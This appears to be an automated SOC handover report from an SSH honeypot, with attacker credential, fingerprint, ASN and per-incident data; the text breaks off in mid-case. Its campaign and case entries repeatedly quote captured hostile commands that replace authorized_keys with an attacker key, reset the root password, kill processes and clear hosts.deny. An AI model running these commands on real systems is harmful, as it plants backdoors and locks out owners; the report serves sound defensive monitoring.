# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-24 |
| **Generated At** | 2026-05-24T07:27:43Z |
| **Shift Time** | 07:27 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **400** |
| Confirmed Threats | **328** |
| False Positives Filtered | **72** (18.0%) |
| Unique Attacker IPs | **58** |
| Countries of Origin | **27** |
| High Severity Cases | **37** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **363** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **90** |
| Unique Credential Pairs | **60** |
| Unique Usernames | **37** |
| Unique Passwords | **53** |
| Successful Auth Pairs | **31** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 38 |
| `345gs5662d34` | 15 |
| `admin` | 2 |
| `ubuntu` | 2 |
| `a` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 17 |
| `345gs5662d34` | 15 |
| `123456` | 4 |
| `` | 2 |
| `root` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 17 |
| `345gs5662d34` | `345gs5662d34` | 15 |
| `a` | `a` | 1 |
| `nil` | `` | 1 |
| `admin` | `admin` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `` | `101.126.147.62` | 2026-05-24T03:59:09 |
| `root` | `Qwerty#2024` | `103.49.238.63` | 2026-05-24T04:06:09 |
| `root` | `3245gs5662d34` | `103.49.238.63` | 2026-05-24T04:06:12 |
| `root` | `135790135790` | `186.219.184.142` | 2026-05-24T04:11:38 |
| `root` | `3245gs5662d34` | `186.219.184.142` | 2026-05-24T04:11:46 |
| `root` | `ok` | `180.184.182.87` | 2026-05-24T04:41:29 |
| `root` | `brian123` | `102.88.137.80` | 2026-05-24T04:50:34 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-05-24T04:50:41 |
| `root` | `Hh123456@` | `45.78.202.217` | 2026-05-24T05:08:06 |
| `root` | `3245gs5662d34` | `45.78.202.217` | 2026-05-24T05:08:09 |
| `root` | `x` | `40.121.179.100` | 2026-05-24T05:46:06 |
| `root` | `3245gs5662d34` | `40.121.179.100` | 2026-05-24T05:46:34 |
| `root` | `!@#$qwer1234` | `113.249.112.97` | 2026-05-24T06:22:29 |
| `root` | `3245gs5662d34` | `113.249.112.97` | 2026-05-24T06:22:39 |
| `root` | `12345` | `113.249.112.97` | 2026-05-24T06:24:50 |
| `root` | `juniper123` | `154.83.12.172` | 2026-05-24T06:25:38 |
| `root` | `3245gs5662d34` | `154.83.12.172` | 2026-05-24T06:25:41 |
| `root` | `admin@123.com` | `102.88.137.213` | 2026-05-24T06:29:00 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-05-24T06:29:07 |
| `root` | `qwertyuiop` | `102.88.137.213` | 2026-05-24T06:33:09 |
| `root` | `ubuntu` | `102.88.137.213` | 2026-05-24T06:54:16 |
| `root` | `aA123456` | `125.22.162.46` | 2026-05-24T07:14:51 |
| `root` | `3245gs5662d34` | `125.22.162.46` | 2026-05-24T07:14:53 |
| `root` | `Qwe123...` | `103.76.120.198` | 2026-05-24T07:21:48 |
| `root` | `3245gs5662d34` | `103.76.120.198` | 2026-05-24T07:21:53 |
| `root` | `aA@123456` | `103.76.120.198` | 2026-05-24T07:22:03 |
| `root` | `1qazXSW@123` | `103.76.120.198` | 2026-05-24T07:23:09 |
| `root` | `j` | `103.76.120.198` | 2026-05-24T07:23:36 |
| `root` | `Xy12345678` | `103.76.120.198` | 2026-05-24T07:24:05 |
| `root` | `root123` | `101.96.202.48` | 2026-05-24T07:25:22 |
| `root` | `3245gs5662d34` | `101.96.202.48` | 2026-05-24T07:25:33 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **400** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 103 |
| OpenSSH | 9 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 66 | 13 |
| `03a80b21afa8...` | Modern SSH client | 11 | 2 |
| `c118de82e19e...` | Mirai/variant | 9 | 1 |
| `af8223ac9914...` | libssh-based | 9 | 3 |
| `713bd9cc9355...` | Mirai/variant | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 66 | 13 | Mirai/variant |
| `03a80b21afa8...` | libssh | 11 | 2 | Modern SSH client |
| `c118de82e19e...` | OpenSSH | 9 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 5 | — |
| `af8223ac9914...` | libssh | 9 | 3 | libssh-based |
| `713bd9cc9355...` | libssh | 6 | 1 | Mirai/variant |
| `19532158b559...` | libssh | 1 | 1 | Mirai/variant |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 17 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:1B748WA99Dl2"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `113.249.112.97`, `180.184.182.87`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `113.249.112.97`, `103.49.238.63`, `125.22.162.46`, `102.88.137.80`, `103.76.120.198`, `101.96.202.48`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **58** |
| Unique ASNs | **44** |
| High-Risk ASNs | **27** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 5 | HIGH |
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | HIGH |
| `AS210022` | Trade Link Logistics General Trading & Contracting Company W.L.L., L.L.C. | 2 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 2 | HIGH |
| `AS29465` | MTN NIGERIA Communication limited | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (37)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0df36c10bb61

| Field | Detail |
|---|---|
| **Source IP** | `101.126.147[.]62` |
| **First Seen** | 2026-05-24 03:59 |
| **Last Seen** | 2026-05-24 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 03:59:07` | `cowrie.session.connect` |
| `2026-05-24 03:59:07` | `cowrie.client.version` |
| `2026-05-24 03:59:08` | `cowrie.client.kex` |
| `2026-05-24 03:59:09` | `cowrie.login.success` |
| `2026-05-24 03:59:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.147[.]62` to AbuseIPDB if not already reported
- [ ] Block `101.126.147[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b09e67c8cc77

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]63` |
| **First Seen** | 2026-05-24 04:06 |
| **Last Seen** | 2026-05-24 04:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 04:06:09` | `cowrie.session.connect` |
| `2026-05-24 04:06:09` | `cowrie.client.version` |
| `2026-05-24 04:06:09` | `cowrie.client.kex` |
| `2026-05-24 04:06:09` | `cowrie.login.success` |
| `2026-05-24 04:06:09` | `cowrie.session.params` |
| `2026-05-24 04:06:09` | `cowrie.command.input` |
| `2026-05-24 04:06:09` | `cowrie.command.failed` |
| `2026-05-24 04:06:09` | `cowrie.log.closed` |
| `2026-05-24 04:06:10` | `cowrie.session.params` |
| `2026-05-24 04:06:10` | `cowrie.command.input` |
| `2026-05-24 04:06:10` | `cowrie.session.file_download` |
| `2026-05-24 04:06:10` | `cowrie.log.closed` |
| `2026-05-24 04:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]63` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8f7e943ea0b

| Field | Detail |
|---|---|
| **Source IP** | `103.49.238[.]63` |
| **First Seen** | 2026-05-24 04:06 |
| **Last Seen** | 2026-05-24 04:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 04:06:11` | `cowrie.session.connect` |
| `2026-05-24 04:06:11` | `cowrie.client.version` |
| `2026-05-24 04:06:11` | `cowrie.client.kex` |
| `2026-05-24 04:06:12` | `cowrie.login.success` |
| `2026-05-24 04:06:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.49.238[.]63` to AbuseIPDB if not already reported
- [ ] Block `103.49.238[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ca7e21956bc

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-24 04:11 |
| **Last Seen** | 2026-05-24 04:11 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 04:11:37` | `cowrie.session.connect` |
| `2026-05-24 04:11:37` | `cowrie.client.version` |
| `2026-05-24 04:11:37` | `cowrie.client.kex` |
| `2026-05-24 04:11:38` | `cowrie.login.success` |
| `2026-05-24 04:11:39` | `cowrie.session.params` |
| `2026-05-24 04:11:39` | `cowrie.command.input` |
| `2026-05-24 04:11:39` | `cowrie.command.failed` |
| `2026-05-24 04:11:40` | `cowrie.log.closed` |
| `2026-05-24 04:11:40` | `cowrie.session.params` |
| `2026-05-24 04:11:40` | `cowrie.command.input` |
| `2026-05-24 04:11:41` | `cowrie.session.file_download` |
| `2026-05-24 04:11:41` | `cowrie.log.closed` |
| `2026-05-24 04:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d62bb18724bc

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-24 04:11 |
| **Last Seen** | 2026-05-24 04:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 04:11:44` | `cowrie.session.connect` |
| `2026-05-24 04:11:44` | `cowrie.client.version` |
| `2026-05-24 04:11:45` | `cowrie.client.kex` |
| `2026-05-24 04:11:46` | `cowrie.login.success` |
| `2026-05-24 04:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56c2bcd905b5

| Field | Detail |
|---|---|
| **Source IP** | `180.184.182[.]87` |
| **First Seen** | 2026-05-24 04:41 |
| **Last Seen** | 2026-05-24 04:42 |
| **Session Duration** | 39s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:1B748WA99Dl2"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 04:41:28` | `cowrie.session.connect` |
| `2026-05-24 04:41:28` | `cowrie.client.version` |
| `2026-05-24 04:41:28` | `cowrie.client.kex` |
| `2026-05-24 04:41:29` | `cowrie.login.success` |
| `2026-05-24 04:41:29` | `cowrie.session.params` |
| `2026-05-24 04:41:29` | `cowrie.command.input` |
| `2026-05-24 04:41:29` | `cowrie.command.failed` |
| `2026-05-24 04:41:30` | `cowrie.log.closed` |
| `2026-05-24 04:41:30` | `cowrie.session.params` |
| `2026-05-24 04:41:30` | `cowrie.command.input` |
| `2026-05-24 04:41:30` | `cowrie.session.file_download` |
| `2026-05-24 04:41:30` | `cowrie.log.closed` |
| `2026-05-24 04:41:58` | `cowrie.session.params` |
| `2026-05-24 04:41:58` | `cowrie.command.input` |
| `2026-05-24 04:41:58` | `cowrie.log.closed` |
| `2026-05-24 04:41:59` | `cowrie.session.params` |
| `2026-05-24 04:41:59` | `cowrie.command.input` |
| `2026-05-24 04:41:59` | `cowrie.log.closed` |
| `2026-05-24 04:42:00` | `cowrie.session.params` |
| `2026-05-24 04:42:00` | `cowrie.command.input` |
| `2026-05-24 04:42:00` | `cowrie.session.file_download` |
| `2026-05-24 04:42:00` | `cowrie.log.closed` |
| `2026-05-24 04:42:00` | `cowrie.session.params` |
| `2026-05-24 04:42:00` | `cowrie.command.input` |
| `2026-05-24 04:42:01` | `cowrie.log.closed` |
| `2026-05-24 04:42:01` | `cowrie.session.params` |
| `2026-05-24 04:42:01` | `cowrie.command.input` |
| `2026-05-24 04:42:01` | `cowrie.log.closed` |
| `2026-05-24 04:42:01` | `cowrie.session.params` |
| `2026-05-24 04:42:01` | `cowrie.command.input` |
| `2026-05-24 04:42:01` | `cowrie.command.input` |
| `2026-05-24 04:42:02` | `cowrie.log.closed` |
| `2026-05-24 04:42:02` | `cowrie.session.params` |
| `2026-05-24 04:42:02` | `cowrie.command.input` |
| `2026-05-24 04:42:02` | `cowrie.log.closed` |
| `2026-05-24 04:42:03` | `cowrie.session.params` |
| `2026-05-24 04:42:03` | `cowrie.command.input` |
| `2026-05-24 04:42:03` | `cowrie.log.closed` |
| `2026-05-24 04:42:03` | `cowrie.session.params` |
| `2026-05-24 04:42:03` | `cowrie.command.input` |
| `2026-05-24 04:42:03` | `cowrie.log.closed` |
| `2026-05-24 04:42:03` | `cowrie.session.params` |
| `2026-05-24 04:42:03` | `cowrie.command.input` |
| `2026-05-24 04:42:04` | `cowrie.log.closed` |
| `2026-05-24 04:42:04` | `cowrie.session.params` |
| `2026-05-24 04:42:04` | `cowrie.command.input` |
| `2026-05-24 04:42:05` | `cowrie.log.closed` |
| `2026-05-24 04:42:05` | `cowrie.session.params` |
| `2026-05-24 04:42:05` | `cowrie.command.input` |
| `2026-05-24 04:42:05` | `cowrie.log.closed` |
| `2026-05-24 04:42:06` | `cowrie.session.params` |
| `2026-05-24 04:42:06` | `cowrie.command.input` |
| `2026-05-24 04:42:06` | `cowrie.log.closed` |
| `2026-05-24 04:42:06` | `cowrie.session.params` |
| `2026-05-24 04:42:06` | `cowrie.command.input` |
| `2026-05-24 04:42:06` | `cowrie.log.closed` |
| `2026-05-24 04:42:06` | `cowrie.session.params` |
| `2026-05-24 04:42:06` | `cowrie.command.input` |
| `2026-05-24 04:42:07` | `cowrie.log.closed` |
| `2026-05-24 04:42:07` | `cowrie.session.params` |
| `2026-05-24 04:42:07` | `cowrie.command.input` |
| `2026-05-24 04:42:07` | `cowrie.log.closed` |
| `2026-05-24 04:42:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.182[.]87` to AbuseIPDB if not already reported
- [ ] Block `180.184.182[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9697de3bd781

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-24 04:50 |
| **Last Seen** | 2026-05-24 04:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 04:50:32` | `cowrie.session.connect` |
| `2026-05-24 04:50:32` | `cowrie.client.version` |
| `2026-05-24 04:50:32` | `cowrie.client.kex` |
| `2026-05-24 04:50:34` | `cowrie.login.success` |
| `2026-05-24 04:50:34` | `cowrie.session.params` |
| `2026-05-24 04:50:34` | `cowrie.command.input` |
| `2026-05-24 04:50:34` | `cowrie.command.failed` |
| `2026-05-24 04:50:35` | `cowrie.log.closed` |
| `2026-05-24 04:50:35` | `cowrie.session.params` |
| `2026-05-24 04:50:35` | `cowrie.command.input` |
| `2026-05-24 04:50:36` | `cowrie.session.file_download` |
| `2026-05-24 04:50:36` | `cowrie.log.closed` |
| `2026-05-24 04:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e10621434cbf

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-24 04:50 |
| **Last Seen** | 2026-05-24 04:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 04:50:39` | `cowrie.session.connect` |
| `2026-05-24 04:50:39` | `cowrie.client.version` |
| `2026-05-24 04:50:39` | `cowrie.client.kex` |
| `2026-05-24 04:50:41` | `cowrie.login.success` |
| `2026-05-24 04:50:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45d16137ef07

| Field | Detail |
|---|---|
| **Source IP** | `45.78.202[.]217` |
| **First Seen** | 2026-05-24 05:08 |
| **Last Seen** | 2026-05-24 05:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 05:08:04` | `cowrie.session.connect` |
| `2026-05-24 05:08:05` | `cowrie.client.version` |
| `2026-05-24 05:08:05` | `cowrie.client.kex` |
| `2026-05-24 05:08:06` | `cowrie.login.success` |
| `2026-05-24 05:08:06` | `cowrie.session.params` |
| `2026-05-24 05:08:06` | `cowrie.command.input` |
| `2026-05-24 05:08:06` | `cowrie.command.failed` |
| `2026-05-24 05:08:06` | `cowrie.log.closed` |
| `2026-05-24 05:08:06` | `cowrie.session.params` |
| `2026-05-24 05:08:06` | `cowrie.command.input` |
| `2026-05-24 05:08:06` | `cowrie.session.file_download` |
| `2026-05-24 05:08:06` | `cowrie.log.closed` |
| `2026-05-24 05:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.202[.]217` to AbuseIPDB if not already reported
- [ ] Block `45.78.202[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-445f603b048b

| Field | Detail |
|---|---|
| **Source IP** | `45.78.202[.]217` |
| **First Seen** | 2026-05-24 05:08 |
| **Last Seen** | 2026-05-24 05:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
